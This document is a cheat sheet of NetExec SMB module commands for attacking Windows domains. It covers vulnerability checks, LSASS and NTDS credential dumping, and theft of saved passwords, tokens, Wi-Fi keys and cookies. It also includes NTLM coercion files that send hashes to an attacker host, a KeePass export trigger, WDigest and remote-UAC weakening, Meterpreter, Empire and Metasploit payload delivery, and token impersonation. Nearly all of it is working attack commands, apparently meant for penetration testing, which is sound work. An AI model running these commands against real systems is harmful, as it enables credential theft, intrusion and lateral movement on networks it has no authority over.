# NetExec SMB Modules

## nxc smb modules

### enum_av

Enumerate enum av with NetExec SMB Modules.

Identify endpoint protection products on the target via LsarLookupNames. No privilege required.

```sh title:"NetExec SMB Modules Enumerate Enum Av"
nxc smb $domain -u $user $auth_flags -M enum_av
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_ca

Enumerate enum ca with NetExec SMB Modules.

Anonymously hunt for ADCS CAs over RPC endpoints.

```sh title:"NetExec SMB Modules Enumerate Enum Ca"
nxc smb $domain -u $user $auth_flags -M enum_ca
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_cve

Enumerate enum CVE with NetExec SMB Modules.

Enumerate common CVEs by querying registry OS version + UBR. Quick way to triage missing patches.

```sh title:"NetExec SMB Modules Enumerate Enum CVE"
nxc smb $domain -u $user $auth_flags -M enum_cve
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### gpp_privileges

Run gpp privileges with NetExec SMB Modules.

Extract privileges assigned via GPOs and resolve SIDs through LDAP. Maps GPO-granted SeDebug etc.

```sh title:"NetExec SMB Modules Run Gpp Privileges"
nxc smb $domain -u $user $auth_flags -M gpp_privileges
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ioxidresolver

Find ioxidresolver with NetExec SMB Modules.

Identify additional active network interfaces on the host (multi-homed boxes, hidden subnets).

```sh title:"NetExec SMB Modules Find Ioxidresolver"
nxc smb $domain -u $user $auth_flags -M ioxidresolver
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ms17-010

Check ms17 010 with NetExec SMB Modules.

Check for MS17-010 (EternalBlue) exposure. Untested for exploitation, vuln check only.

```sh title:"NetExec SMB Modules Check Ms17 010"
nxc smb $domain -u $user $auth_flags -M ms17-010
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nopac

Check nopac with NetExec SMB Modules.

Check if the DC is vulnerable to NoPac (CVE-2021-42278/42287). Domain user to DA path.

```sh title:"NetExec SMB Modules Check Nopac"
nxc smb $domain -u $user $auth_flags -M nopac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlm_reflection

Check NTLM reflection with NetExec SMB Modules.

Check whether the OS is vulnerable to NTLM reflection (CVE-2025-33073).

```sh title:"NetExec SMB Modules Check NTLM Reflection"
nxc smb $domain -u $user $auth_flags -M ntlm_reflection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### printnightmare

Check printnightmare with NetExec SMB Modules.

Check vulnerability to PrintNightmare (CVE-2021-1675/34527).

```sh title:"NetExec SMB Modules Check Printnightmare"
nxc smb $domain -u $user $auth_flags -M printnightmare
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remove-mic

Remove mic with NetExec SMB Modules.

Check vulnerability to CVE-2019-1040 (NTLM MIC removal). Pair with relay attacks.

```sh title:"NetExec SMB Modules Remove Mic"
nxc smb $domain -u $user $auth_flags -M remove-mic
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm-recon6

Check sccm recon6 with NetExec SMB Modules.

Check via winreg whether the target is an SCCM Distribution Point or Primary Site Server (RECON-6).

```sh title:"NetExec SMB Modules Check Sccm Recon6"
nxc smb $domain -u $user $auth_flags -M sccm-recon6
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### smbghost

Check smbghost with NetExec SMB Modules.

Check SMB 3.1.1 dialect + compression flag (SMBGhost CVE-2020-0796).

```sh title:"NetExec SMB Modules Check Smbghost"
nxc smb $domain -u $user $auth_flags -M smbghost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### spooler

Enable spooler with NetExec SMB Modules.

Detect whether the print spooler service is enabled. Prereq for the printer-bug coercion.

```sh title:"NetExec SMB Modules Enable Spooler"
nxc smb $domain -u $user $auth_flags -M spooler
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### webdav

Check webdav with NetExec SMB Modules.

Check whether the WebClient service is running on the target. Required for HTTP-based coercion (auth via UNC).

```sh title:"NetExec SMB Modules Check Webdav"
nxc smb $domain -u $user $auth_flags -M webdav
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### zerologon

Check zerologon with NetExec SMB Modules.

Check whether the DC is vulnerable to Zerologon (CVE-2020-1472).

```sh title:"NetExec SMB Modules Check Zerologon"
nxc smb $domain -u $user $auth_flags -M zerologon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### aws-credentials

Dump AWS credentials with NetExec SMB Modules.

Search the target filesystem for AWS credential files. Also available on winrm and ssh protocols.

```sh title:"NetExec SMB Modules Dump AWS Credentials"
nxc smb $domain -u $user $auth_flags -M aws-credentials
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### change-password

Dump change password with NetExec SMB Modules.

Change or reset a user's password via SMB.

```sh title:"NetExec SMB Modules Dump Change Password"
nxc smb $domain -u $user $auth_flags -M change-password -o USER=$target_user NEWPASS=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var target_pass
-->

### drop-library-ms

Run drop library ms with NetExec SMB Modules.

Plant a `.library-ms` file on writable shares to coerce NTLMv2 hashes via CVE-2025-24054 (zero-click).

```sh title:"NetExec SMB Modules Run Drop Library Ms"
nxc smb $domain -u $user $auth_flags -M drop-library-ms -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### scuffy

Run scuffy with NetExec SMB Modules.

Drop a `.scf` file with a UNC icon path on every writable share. Triggers NTLM auth when the folder is browsed.

```sh title:"NetExec SMB Modules Run Scuffy"
nxc smb $domain -u $user $auth_flags -M scuffy -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### bitlocker (HIGH)

Read bitlocker (HIGH) with NetExec SMB Modules.

Read BitLocker status on targets (enabled/disabled).

```sh title:"NetExec SMB Modules Read Bitlocker (HIGH)"
nxc smb $domain -u $user $auth_flags -M bitlocker
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_dns (HIGH)

Dump enum DNS (HIGH) with NetExec SMB Modules.

Use WMI to dump DNS records from an AD-integrated DNS server.

```sh title:"NetExec SMB Modules Dump Enum DNS (HIGH)"
nxc smb $domain -u $user $auth_flags -M enum_dns
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_interfaces (HIGH)

Show enum interfaces (HIGH) with NetExec SMB Modules.

Read network interface info (name, IP, mask, gateway) from the remote registry.

```sh title:"NetExec SMB Modules Show Enum Interfaces (HIGH)"
nxc smb $domain -u $user $auth_flags -M enum_interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hyperv-host (HIGH)

Run hyperv host (HIGH) with NetExec SMB Modules.

Look up which Hyper-V host owns the target VM via registry.

```sh title:"NetExec SMB Modules Run Hyperv Host (HIGH)"
nxc smb $domain -u $user $auth_flags -M hyperv-host
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### install_elevated (HIGH)

Install elevated (HIGH) with NetExec SMB Modules.

Check the AlwaysInstallElevated registry settings (low-priv MSI install as SYSTEM).

```sh title:"NetExec SMB Modules Install Elevated (HIGH)"
nxc smb $domain -u $user $auth_flags -M install_elevated
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_discover (HIGH)

Discover keepass discover (HIGH) with NetExec SMB Modules.

Search for KeePass database files and running KeePass processes on the target.

```sh title:"NetExec SMB Modules Discover Keepass Discover (HIGH)"
nxc smb $domain -u $user $auth_flags -M keepass_discover
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lockscreendoors (HIGH)

Set lockscreendoors (HIGH) with NetExec SMB Modules.

Detect lock-screen backdoors by checking the FileDescription of accessibility binaries (sethc, utilman, etc.).

```sh title:"NetExec SMB Modules Set Lockscreendoors (HIGH)"
nxc smb $domain -u $user $auth_flags -M lockscreendoors
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlmv1 (HIGH)

Run ntlmv1 (HIGH) with NetExec SMB Modules.

Detect if `lmcompatibilitylevel` is below 3, meaning NTLMv1 is permitted.

```sh title:"NetExec SMB Modules Run Ntlmv1 (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntlmv1
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### presence (HIGH)

Enumerate presence (HIGH) with NetExec SMB Modules.

Trace Domain and Enterprise Admin presence on the target over SMB. Maps where high-priv accounts have logged on.

```sh title:"NetExec SMB Modules Enumerate Presence (HIGH)"
nxc smb $domain -u $user $auth_flags -M presence
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-query (HIGH)

Enumerate reg query (HIGH) with NetExec SMB Modules.

Run an arbitrary registry query on the target.

```sh title:"NetExec SMB Modules Enumerate Reg Query (HIGH)"
nxc smb $domain -u $user $auth_flags -M reg-query -o KEY=$reg_key
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var reg_key
-->

### runasppl (HIGH)

Dump runasppl (HIGH) with NetExec SMB Modules.

Check whether the LSA RunAsPPL bit is set. If unset, LSASS can be touched by ordinary admin tooling.

```sh title:"NetExec SMB Modules Dump Runasppl (HIGH)"
nxc smb $domain -u $user $auth_flags -M runasppl
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### test_connection (HIGH)

Check test connection (HIGH) with NetExec SMB Modules.

Ping a host through nxc to sanity-check reachability before running heavier modules.

```sh title:"NetExec SMB Modules Check Test Connection (HIGH)"
nxc smb $domain -u $user $auth_flags -M test_connection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### uac (HIGH)

Read uac (HIGH) with NetExec SMB Modules.

Read UAC configuration on the target.

```sh title:"NetExec SMB Modules Read Uac (HIGH)"
nxc smb $domain -u $user $auth_flags -M uac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wcc (HIGH)

Run wcc (HIGH) with NetExec SMB Modules.

Run the Windows security configuration check (broad hardening audit).

```sh title:"NetExec SMB Modules Run Wcc (HIGH)"
nxc smb $domain -u $user $auth_flags -M wcc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dpapi_hash (HIGH)

Dump DPAPI hash (HIGH) with NetExec SMB Modules.

Remotely dump DPAPI hashes derived from masterkeys.

```sh title:"NetExec SMB Modules Dump DPAPI Hash (HIGH)"
nxc smb $domain -u $user $auth_flags -M dpapi_hash
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### eventlog_creds (HIGH)

Download eventlog creds (HIGH) with NetExec SMB Modules.

Extract credentials from Windows event logs (4688 process-creation and SYSMON command lines).

```sh title:"NetExec SMB Modules Download Eventlog Creds (HIGH)"
nxc smb $domain -u $user $auth_flags -M eventlog_creds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### handlekatz (HIGH)

Dump handlekatz (HIGH) with NetExec SMB Modules.

LSASS dump using handlekatz64, parsed remotely with pypykatz.

```sh title:"NetExec SMB Modules Dump Handlekatz (HIGH)"
nxc smb $domain -u $user $auth_flags -M handlekatz
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### iis (HIGH)

Run iis (HIGH) with NetExec SMB Modules.

Read IIS Application Pool configs via appcmd.exe to extract app-pool identity credentials.

```sh title:"NetExec SMB Modules Run Iis (HIGH)"
nxc smb $domain -u $user $auth_flags -M iis
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_trigger (HIGH)

Run keepass trigger (HIGH) with NetExec SMB Modules.

Plant a malicious KeePass trigger that exports the database in cleartext on next unlock.

```sh title:"NetExec SMB Modules Run Keepass Trigger (HIGH)"
nxc smb $domain -u $user $auth_flags -M keepass_trigger
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lsassy (HIGH)

Dump lsassy (HIGH) with NetExec SMB Modules.

Dump LSASS and parse the result remotely using lsassy.

```sh title:"NetExec SMB Modules Dump Lsassy (HIGH)"
nxc smb $domain -u $user $auth_flags -M lsassy
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### masky (HIGH)

Dump masky (HIGH) with NetExec SMB Modules.

Dump domain user credentials via ADCS + KDC (PKINIT chain to NT hash).

```sh title:"NetExec SMB Modules Dump Masky (HIGH)"
nxc smb $domain -u $user $auth_flags -M masky
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mobaxterm (HIGH)

Run mobaxterm (HIGH) with NetExec SMB Modules.

Dump MobaXterm credentials via remote registry or NTUSER.dat export.

```sh title:"NetExec SMB Modules Run Mobaxterm (HIGH)"
nxc smb $domain -u $user $auth_flags -M mobaxterm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mremoteng (HIGH)

Dump mremoteng (HIGH) with NetExec SMB Modules.

Dump mRemoteNG passwords from AppData and recursively from Desktop / Documents.

```sh title:"NetExec SMB Modules Dump Mremoteng (HIGH)"
nxc smb $domain -u $user $auth_flags -M mremoteng
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### msol (HIGH)

Run msol (HIGH) with NetExec SMB Modules.

Dump the MSOL cleartext password and Entra ID credentials from the local DB on the Entra ID Connect server.

```sh title:"NetExec SMB Modules Run Msol (HIGH)"
nxc smb $domain -u $user $auth_flags -M msol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nanodump (HIGH)

Dump nanodump (HIGH) with NetExec SMB Modules.

LSASS dump using nanodump, parsed remotely with pypykatz. Also available on the mssql protocol.

```sh title:"NetExec SMB Modules Dump Nanodump (HIGH)"
nxc smb $domain -u $user $auth_flags -M nanodump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad (HIGH)

Run notepad (HIGH) with NetExec SMB Modules.

Extract content from the Windows Notepad tab-state binary files (unsaved drafts).

```sh title:"NetExec SMB Modules Run Notepad (HIGH)"
nxc smb $domain -u $user $auth_flags -M notepad
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad++ (HIGH)

Run notepad++ (HIGH) with NetExec SMB Modules.

Extract Notepad++ unsaved files.

```sh title:"NetExec SMB Modules Run Notepad++ (HIGH)"
nxc smb $domain -u $user $auth_flags -M notepad++
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntds-dump-raw (HIGH)

Dump NTDS dump raw (HIGH) with NetExec SMB Modules.

Extract NTDS.dit, SAM, and SYSTEM by reading the raw disk. Bypasses VSS-based detections. Also runs over winrm and wmi.

```sh title:"NetExec SMB Modules Dump NTDS Dump Raw (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntds-dump-raw
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntdsutil (HIGH)

Dump ntdsutil (HIGH) with NetExec SMB Modules.

Dump NTDS using `ntdsutil.exe` snapshot path.

```sh title:"NetExec SMB Modules Dump Ntdsutil (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntdsutil
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### powershell_history (HIGH)

Read powershell history (HIGH) with NetExec SMB Modules.

Pull every user's PSReadline history and grep for sensitive command patterns.

```sh title:"NetExec SMB Modules Read Powershell History (HIGH)"
nxc smb $domain -u $user $auth_flags -M powershell_history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### procdump (HIGH)

Dump procdump (HIGH) with NetExec SMB Modules.

LSASS dump using procdump64, parsed remotely with pypykatz.

```sh title:"NetExec SMB Modules Dump Procdump (HIGH)"
nxc smb $domain -u $user $auth_flags -M procdump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### putty (HIGH)

Download putty (HIGH) with NetExec SMB Modules.

Find PuTTY-saved SSH private keys in the registry and download them.

```sh title:"NetExec SMB Modules Download Putty (HIGH)"
nxc smb $domain -u $user $auth_flags -M putty
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### rdcman (HIGH)

Dump rdcman (HIGH) with NetExec SMB Modules.

Remotely dump RDCMan (Remote Desktop Connection Manager) saved credentials.

```sh title:"NetExec SMB Modules Dump Rdcman (HIGH)"
nxc smb $domain -u $user $auth_flags -M rdcman
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recent_files (HIGH)

Extract recent files (HIGH) with NetExec SMB Modules.

Extract recently modified files from the target. Useful for finding active project / handover docs.

```sh title:"NetExec SMB Modules Extract Recent Files (HIGH)"
nxc smb $domain -u $user $auth_flags -M recent_files
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recyclebin (HIGH)

List recyclebin (HIGH) with NetExec SMB Modules.

List and export the contents of users' recycle bins.

```sh title:"NetExec SMB Modules List Recyclebin (HIGH)"
nxc smb $domain -u $user $auth_flags -M recyclebin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-winlogon (HIGH)

Run reg winlogon (HIGH) with NetExec SMB Modules.

Collect autologon credentials stored under the Winlogon registry key.

```sh title:"NetExec SMB Modules Run Reg Winlogon (HIGH)"
nxc smb $domain -u $user $auth_flags -M reg-winlogon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### security-questions (HIGH)

Run security questions (HIGH) with NetExec SMB Modules.

Pull users' local-account security questions and answers.

```sh title:"NetExec SMB Modules Run Security Questions (HIGH)"
nxc smb $domain -u $user $auth_flags -M security-questions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### snipped (HIGH)

Download snipped (HIGH) with NetExec SMB Modules.

Download screenshots taken by the new Snipping Tool.

```sh title:"NetExec SMB Modules Download Snipped (HIGH)"
nxc smb $domain -u $user $auth_flags -M snipped
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### teams_localdb (HIGH)

Run teams localdb (HIGH) with NetExec SMB Modules.

Pull the cleartext `ssoauthcookie` from the local Teams database. Kills running Teams processes if needed.

```sh title:"NetExec SMB Modules Run Teams Localdb (HIGH)"
nxc smb $domain -u $user $auth_flags -M teams_localdb
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### veeam (HIGH)

Run veeam (HIGH) with NetExec SMB Modules.

Extract credentials from a local Veeam SQL database. Veeam typically holds backup-target creds across the estate.

```sh title:"NetExec SMB Modules Run Veeam (HIGH)"
nxc smb $domain -u $user $auth_flags -M veeam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### vnc (HIGH)

Dump vnc (HIGH) with NetExec SMB Modules.

Loot passwords from VNC server and client configuration files.

```sh title:"NetExec SMB Modules Dump Vnc (HIGH)"
nxc smb $domain -u $user $auth_flags -M vnc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wam (HIGH)

Dump wam (HIGH) with NetExec SMB Modules.

Dump access tokens from the Token Broker Cache (Web Account Manager).

```sh title:"NetExec SMB Modules Dump Wam (HIGH)"
nxc smb $domain -u $user $auth_flags -M wam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wdigest (HIGH)

Enable wdigest (HIGH) with NetExec SMB Modules.

Toggle the `UseLogonCredential` registry key to re-enable WDigest cleartext credential caching on Win 8.1+.

```sh title:"NetExec SMB Modules Enable Wdigest (HIGH)"
nxc smb $domain -u $user $auth_flags -M wdigest -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wifi (HIGH)

Download wifi (HIGH) with NetExec SMB Modules.

Pull the keys for every wireless interface on the host.

```sh title:"NetExec SMB Modules Download Wifi (HIGH)"
nxc smb $domain -u $user $auth_flags -M wifi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### winscp (HIGH)

Run winscp (HIGH) with NetExec SMB Modules.

Find WinSCP.ini files in registry and default locations, then extract saved credentials.

```sh title:"NetExec SMB Modules Run Winscp (HIGH)"
nxc smb $domain -u $user $auth_flags -M winscp
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### empire_exec (HIGH)

Start empire exec (HIGH) with NetExec SMB Modules.

Generate an Empire launcher via the RESTful API and execute it on the target.

```sh title:"NetExec SMB Modules Start Empire Exec (HIGH)"
nxc smb $domain -u $user $auth_flags -M empire_exec
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hash_spider (HIGH)

Dump hash spider (HIGH) with NetExec SMB Modules.

Dump LSASS recursively starting from a single hash, using BloodHound to chase local admin paths.

```sh title:"NetExec SMB Modules Dump Hash Spider (HIGH)"
nxc smb $domain -u $user $auth_flags -M hash_spider
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### impersonate (HIGH)

List impersonate (HIGH) with NetExec SMB Modules.

List and impersonate tokens to run commands as locally logged-on users.

```sh title:"NetExec SMB Modules List Impersonate (HIGH)"
nxc smb $domain -u $user $auth_flags -M impersonate
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### met_inject (HIGH)

Download met inject (HIGH) with NetExec SMB Modules.

Download the Meterpreter stager and inject it into memory.

```sh title:"NetExec SMB Modules Download Met Inject (HIGH)"
nxc smb $domain -u $user $auth_flags -M met_inject
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pi (HIGH)

Execute pi (HIGH) with NetExec SMB Modules.

Run a command as a logged-on user via process injection.

```sh title:"NetExec SMB Modules Execute Pi (HIGH)"
nxc smb $domain -u $user $auth_flags -M pi -o COMMAND=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var cmd
-->

### rdp (HIGH)

Disable RDP (HIGH) with NetExec SMB Modules.

Enable or disable RDP on the target via registry. Use to open the door for follow-on lateral movement.

```sh title:"NetExec SMB Modules Disable RDP (HIGH)"
nxc smb $domain -u $user $auth_flags -M rdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remote-uac (HIGH)

Set remote uac (HIGH) with NetExec SMB Modules.

Enable or disable remote UAC. Disabling it lets non-domain admin local accounts perform admin actions over the network.

```sh title:"NetExec SMB Modules Set Remote Uac (HIGH)"
nxc smb $domain -u $user $auth_flags -M remote-uac -o ACTION=disable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### schtask_as (HIGH)

Execute schtask as (HIGH) with NetExec SMB Modules.

Remotely create a scheduled task running as a chosen logged-on user.

```sh title:"NetExec SMB Modules Execute Schtask as (HIGH)"
nxc smb $domain -u $user $auth_flags -M schtask_as -o USER=$target_user CMD=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var cmd
-->

### shadowrdp (HIGH)

Run shadowrdp (HIGH) with NetExec SMB Modules.

Enable or disable Shadow RDP (silent session takeover via RDS shadowing).

```sh title:"NetExec SMB Modules Run Shadowrdp (HIGH)"
nxc smb $domain -u $user $auth_flags -M shadowrdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### web_delivery (HIGH)

Run web delivery (HIGH) with NetExec SMB Modules.

Kick off a Metasploit web_delivery payload on the target.

```sh title:"NetExec SMB Modules Run Web Delivery (HIGH)"
nxc smb $domain -u $user $auth_flags -M web_delivery
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

